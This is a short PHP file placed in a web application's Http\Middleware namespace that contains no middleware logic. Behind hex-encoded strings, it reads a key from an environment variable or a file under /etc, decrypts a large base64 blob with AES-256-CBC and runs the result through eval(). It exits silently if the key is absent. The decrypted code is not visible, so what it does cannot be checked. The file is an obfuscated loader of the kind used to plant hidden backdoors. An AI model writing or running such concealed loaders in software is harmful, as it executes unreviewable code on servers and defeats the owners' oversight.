<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('fLXudL/gyVnyx7+wuJr33Q==');

$c=base64_decode(

'twoRACmLIXVoDNJmPeRW0H4cLzIG7BuWt3ryv8uZrJ0uxln/7euP7MevSjjz6J+vkJTCOfiTPpv2' .
'OsB0Bc0eGTrNs2Us3ENlG8YMXTqcWySqrzogIw9h7hgYqxg5dIH91jXgbtDVmLy84jQUMknvQKtE' .
'q1TJsrE7ktYq8hDZSA2EGAQZrHNeopm+3OkIPeRNFYd7kfSAnsABJyG8+emQUgjze7kq4i7clgfQ' .
'G7Q3q/i0avfwdpWu/3Rs0UCNE9Cxf7TzdIKcvCBVda1vPeSmf/Bkv9/md604KxXd8Dvw7QngdXbM' .
'1rAEcjusO6CxVm7QSEjqkTFqsYtR6XiELNJ3l6hSCdwLYhpCWRFD9pqGpWikkpd2hhksnqzE9d8w' .
'Xs+x/xEUAha/Al2I4t2tPzwL62qdV5BnA94i7QpPP/Pq/R7F1ZaBgv0xdc/PDt6dWOhouD28ZX5g' .
'LVt3JTQ93e1wFayUA91aj3Yfdgd8PUMLhmAIh4jdunlEu/nQg8q91NsZLxXrnGMvctJj0UGGSjmh' .
'0dFR3cRLvdlnIOgozP4nfPTjTaYk1wmUC/N+Jp4Hxr5IDy/A/ua3fC/Ay/nOVAta8ffGNXuk2+gF' .
'6239qr8Zefau3ZtX56VPCseZLqA/l1uzW1MM4Vw2pI9XoVKuRjyHtDFZ5G1+ljQG4x67mHsWmUTS' .
'z2Hn3jWL4oQR8naI53xiJDODV2/Be5utohgG75z7zy/0q321MZR9o99L2klnZ68gUFn9JazYxoPr' .
'X3d+iuC8CQoLx3l20Mn68K4jCtC8Cm3pdDthg+8SkZuWzE1zmeCYsoO/nQvm9ciGiM+NbwalmBTY' .
'ZnEhbx/TbfcnhxCfG+TnJYTZ0YTZ7LQcVSlO2z3znHltmqhiQklZonxibCtxK02KV75qPXwepCh5' .
'wRVHwqcY1INcnEX3wQ8aGCMi5SKkhMrYzyviC1RFvLTaWSpspTkL3Cya7cN3fx36WplwxrFNGs9s' .
'ZBgkGUrmyOgCVVmFMz+SVUxzAQD+r5V/un4zkuiDtuH5nO4tckGfILbtndRKvNXi63+lpk6FSeKY' .
'V39IbYCTEmoPQqs4C5G6TH2UbocHCPHi6WRqu9Go0Kie/trX6UDuuaoLcGF4eyYQYfmRRUs473od' .
'6eT632rx+XnjFSnXdHUoHIchUjzLvI5cpr8QF0ohugww+UgUS14emnQUBtzub9M16ZQHKScggGnV' .
'tGSiDdMmf+rl5joh7Yuoj47xiyl9ElF8yGUvWCkSFCr3Z2NTVUwz4Dfps1aw0B0dmNf2nqFct3Hb' .
'AmOj1BOSAwCcCZSu0mwfOAsfY9OSfxqPd8czdQqwhOCHKVURop4i9JJN+6a1BmH+Tn6//pRaDw/T' .
'OnR122cco0HMFRardVzfIpBBnFCwssc0AlHDVBAkwPY0k/p71V1mIIluW96j2F5fsERsd9zDznmY' .
'2ajvCcHdJ0N9j4sLx7C2bBZTJ5yOVQfbSqd0NKfFDdECtMvkg7m2tFJ7M6tSa0dYQXDAZ8X/HiPa' .
'Ehh4OAMqmw55sDKFHfhCanyr7bWSqHlHSfKozw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

